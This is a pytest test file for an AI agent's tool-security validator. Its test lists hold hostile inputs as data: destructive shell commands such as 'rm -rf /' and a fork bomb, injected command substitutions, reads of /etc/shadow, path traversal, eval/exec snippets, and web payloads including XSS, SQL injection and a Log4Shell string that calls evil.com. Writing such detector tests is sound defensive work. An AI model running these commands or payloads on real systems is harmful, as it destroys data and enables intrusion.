import pytest
from unittest.mock import AsyncMock, MagicMock, patch
import sys
from pathlib import Path

# Add src to path to import modules
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from src.agent_core.security.tool_security import ToolSecurityValidator  # Adjust import based on actual implementation


def test_dangerous_command_detection():
    """Test detection of dangerous commands"""

    validator = ToolSecurityValidator()

    # List of potentially dangerous commands
    dangerous_commands = [
        "rm -rf /",
        "mv ~ /dev/null",
        "cat /etc/passwd",
        "sudo rm -rf /",
        "echo test > /etc/hosts",
        "format C:",
        "del /F /Q C:\\*.*",
        "shutdown -h now",
        ":(){ :|:& };:",
        "python -c \"import os; os.system('rm -rf /home')\"",
        "../../../../../../etc/passwd",
        "cd / && rm -rf *",
        "| cat /etc/shadow",
        "$(rm -rf /)",
        "`rm -rf /`"
    ]

    for cmd in dangerous_commands:
        is_safe = validator.is_command_safe(cmd)
        assert is_safe is False, f"Command '{cmd}' should be flagged as unsafe"


def test_safe_command_validation():
    """Test validation of safe commands"""

    validator = ToolSecurityValidator()

    # List of safe commands
    safe_commands = [
        "echo 'Hello World'",
        "ls -la",
        "pwd",
        "date",
        "whoami",
        "ps aux",
        "python script.py",
        "node server.js",
        "git status",
        "find . -name '*.py'"
    ]

    for cmd in safe_commands:
        is_safe = validator.is_command_safe(cmd)
        assert is_safe is True, f"Command '{cmd}' should be considered safe"


def test_file_path_validation():
    """Test validation of file paths"""

    validator = ToolSecurityValidator()

    # Safe file paths
    safe_paths = [
        "/home/user/document.txt",
        "./relative/path/file.py",
        "../sibling/dir/file.txt",
        "/tmp/temp_file.tmp",
        "file.txt"
    ]

    # Dangerous file paths
    dangerous_paths = [
        "/etc/passwd",
        "/root/.bashrc",
        "/proc/self/environ",
        "/sys/kernel/debug/tracing/trace_pipe",
        "../../../etc/passwd",
        "/dev/null",
        "/dev/random",
        "/boot/grub/grub.conf"
    ]

    for path in safe_paths:
        is_safe = validator.is_path_safe(path)
        assert is_safe is True, f"Path '{path}' should be considered safe"

    for path in dangerous_paths:
        is_safe = validator.is_path_safe(path)
        assert is_safe is False, f"Path '{path}' should be flagged as unsafe"


def test_code_safety_validation():
    """Test validation of code for safety"""

    validator = ToolSecurityValidator()

    # Unsafe code snippets
    unsafe_code = [
        "__import__('os').system('rm -rf /')",
        "eval('import os; os.system(\"malicious command\")')",
        "exec('import shutil; shutil.rmtree(\"/\")')",
        "import subprocess; subprocess.run(['rm', '-rf', '/'])",
        "globals()['__builtins__']['exec']('dangerous code')",
        "getattr(__import__('os'), 'system')('dangerous command')"
    ]

    # Safe code snippets
    safe_code = [
        "x = 1 + 1",
        "def hello(): return 'world'",
        "list(range(10))",
        "import math; math.sqrt(16)",
        "with open('file.txt', 'r') as f: content = f.read()"
    ]

    for code in unsafe_code:
        is_safe = validator.is_code_safe(code)
        assert is_safe is False, f"Code '{code}' should be flagged as unsafe"

    for code in safe_code:
        is_safe = validator.is_code_safe(code)
        assert is_safe is True, f"Code '{code}' should be considered safe"


def test_tool_permission_checking():
    """Test tool permission validation"""

    validator = ToolSecurityValidator()

    # Simulate different user roles and tool access
    user_permissions = {
        'admin': ['file_read', 'file_write', 'command_exec', 'web_search'],
        'user': ['web_search', 'file_read'],
        'guest': ['web_search']
    }

    # Test admin permissions
    assert validator.has_permission('admin', 'command_exec') is True
    assert validator.has_permission('admin', 'file_write') is True

    # Test user permissions
    assert validator.has_permission('user', 'web_search') is True
    assert validator.has_permission('user', 'file_write') is False  # Users can't write files

    # Test guest permissions
    assert validator.has_permission('guest', 'command_exec') is False  # Guests can't execute commands
    assert validator.has_permission('guest', 'web_search') is True


def test_input_sanitization():
    """Test input sanitization functionality"""

    validator = ToolSecurityValidator()

    # Test sanitizing malicious input
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/exploit}",
        "{{7*7}}",  # Potential SSTI
        "<?php echo 'malicious'; ?>"
    ]

    for inp in malicious_inputs:
        sanitized = validator.sanitize_input(inp)
        # Sanitized input should be different from original malicious input
        # Or the validator should flag it appropriately
        assert isinstance(sanitized, str)


def test_security_policy_enforcement():
    """Test enforcement of security policies"""

    validator = ToolSecurityValidator()

    # Test policy for maximum execution time
    assert validator.validate_execution_time(30) is True  # 30 seconds is reasonable
    assert validator.validate_execution_time(3600) is False  # 1 hour might be too long

    # Test policy for resource limits
    assert validator.validate_resource_limits(cpu_percent=50, memory_mb=100) is True
    assert validator.validate_resource_limits(cpu_percent=95, memory_mb=2000) is False


def test_security_validation_integration():
    """Test integration of various security validations"""

    validator = ToolSecurityValidator()

    # Test a command that should pass all validations
    safe_cmd = "echo 'Hello, World!'"

    assert validator.is_command_safe(safe_cmd) is True
    cmd_perms_ok = True  # Assume command execution is permitted
    resource_ok = validator.validate_resource_limits(cpu_percent=10, memory_mb=50)

    overall_safe = all([validator.is_command_safe(safe_cmd), cmd_perms_ok, resource_ok])
    assert overall_safe is True

    # Test a command that should fail validation
    unsafe_cmd = "rm -rf /"

    assert validator.is_command_safe(unsafe_cmd) is False
    overall_unsafe = validator.is_command_safe(unsafe_cmd)
    assert overall_unsafe is False